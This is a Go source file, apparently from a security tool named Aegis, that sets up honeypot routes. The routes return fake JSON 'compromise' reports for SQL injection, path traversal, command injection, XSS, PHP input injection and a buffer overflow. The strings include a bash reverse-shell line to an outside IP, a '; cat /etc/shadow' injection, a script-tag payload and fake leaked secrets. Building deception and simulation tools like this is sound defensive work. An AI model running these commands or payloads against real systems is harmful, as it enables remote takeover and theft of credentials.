package http

import (
	"fmt"
	"net/http"
	"strconv"

	"github.com/aivo-labs/aegis/backend/internal/httputil"
)

// RegisterHoneypotRoutes configure les routes de simulation d'exploitation lorsque le bouclier est désactivé.
func RegisterHoneypotRoutes(mux *http.ServeMux) {
	mux.HandleFunc("/admin/setup.php", func(w http.ResponseWriter, r *http.Request) {
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "EXPOSED_ADMIN_SETUP_PANEL",
			"impact":        "Panneau d'administration exposé au scanner Nikto",
			"leaked_data":   "DB_HOST=timescaledb:5432 | DB_USER=postgres | JWT_SECRET=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9_EXPOSED",
		})
	})

	mux.HandleFunc("/api/v1/search", func(w http.ResponseWriter, r *http.Request) {
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "SQL_INJECTION_UNION_DUMP",
			"impact":        "Extraction de la table users via UNION SELECT",
			"leaked_data":   "[{id:1, user:'admin@entreprise.fr', hash:'$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC', api_key:'sk_live_prod_88419a'}]",
		})
	})

	mux.HandleFunc("/documents/download", func(w http.ResponseWriter, r *http.Request) {
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "PATH_TRAVERSAL_LFI_LEAK",
			"impact":        "Lecture du fichier système /etc/passwd via ../../../../",
			"leaked_data":   "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\npostgres:x:999:999::/var/lib/postgresql:/bin/bash",
		})
	})

	mux.HandleFunc("/api/v1/backup", func(w http.ResponseWriter, r *http.Request) {
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "COMMAND_INJECTION_RCE_SHELL",
			"impact":        "Exécution de commande système (; cat /etc/shadow) en tant que www-data",
			"leaked_data":   "uid=33(www-data) gid=33(www-data) | root:$6$rounds=656000$K9x8Z$7f9a81b0c4d2e...18590:0:99999:7:::",
		})
	})

	mux.HandleFunc("/comments", func(w http.ResponseWriter, r *http.Request) {
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "REFLECTED_XSS_EXECUTION",
			"impact":        "Payload JavaScript <script> exécuté dans le contexte navigateur et vol de session",
			"leaked_data":   "<script>alert('pwned')</script> -> Session Cookie PHPSESSID=a8f9201bc44 exfiltré",
		})
	})

	mux.HandleFunc("/index.php", func(w http.ResponseWriter, r *http.Request) {
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "ZERO_DAY_PHP_RUNTIME_INJECTION",
			"impact":        "Injection de flux php://input (allow_url_include=1) — Accès Shell distant obtenu",
			"leaked_data":   "SHELL_ACCESS_GRANTED: uid=33(www-data) gid=33(www-data) groups=33(www-data) | Linux target-vps 6.8.0-x86_64 (/bin/sh)",
		})
	})

	mux.HandleFunc("/api/v1/upload-stream", func(w http.ResponseWriter, r *http.Request) {
		bytesLen := 40000
		if hdr := r.Header.Get("X-Aegis-Payload-Bytes"); hdr != "" {
			if v, err := strconv.Atoi(hdr); err == nil && v > 0 {
				bytesLen = v
			}
		} else if r.ContentLength > 0 {
			bytesLen = int(r.ContentLength)
		}
		httputil.WriteJSON(w, http.StatusOK, map[string]any{
			"status":        200,
			"compromised":   true,
			"vulnerability": "HEAP_BUFFER_OVERFLOW_RCE (CVE-2026-109618 / PHP2Shell)",
			"impact":        fmt.Sprintf("Débordement mémoire sur le worker applicatif (%d octets > 32768 octets) — Détournement du pointeur d'instruction", bytesLen),
			"leaked_data":   "REVERSE_SHELL_SPAWNED: /bin/sh -i >& /dev/tcp/185.220.101.99/4444 0>&1 (PID 4812)",
		})
	})
}
